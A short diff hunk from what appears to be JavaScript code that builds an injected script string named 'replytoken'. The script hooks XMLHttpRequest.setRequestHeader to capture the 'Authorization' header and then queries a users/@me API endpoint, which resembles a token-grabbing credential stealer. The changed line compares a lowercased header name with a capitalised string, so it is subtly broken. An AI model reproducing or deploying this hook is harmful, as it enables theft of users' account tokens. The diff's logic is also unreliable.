@@ -244,7 +244,7 @@
 	const replytoken = `
     var oldsetrequestheader = window.XMLHttpRequest.prototype.setRequestHeader
     window.XMLHttpRequest.prototype.setRequestHeader = function(name, value){
-      if(name == "Authorization" && value != null){
+      if(name.toLowerCase() == "Authorization" && value != null){
 		window.XMLHttpRequest.prototype.setRequestHeader = oldsetrequestheader
 		var xmlHttp = new XMLHttpRequest();
 		xmlHttp.open("GET","baseuri/api/v6/users/@me",false);
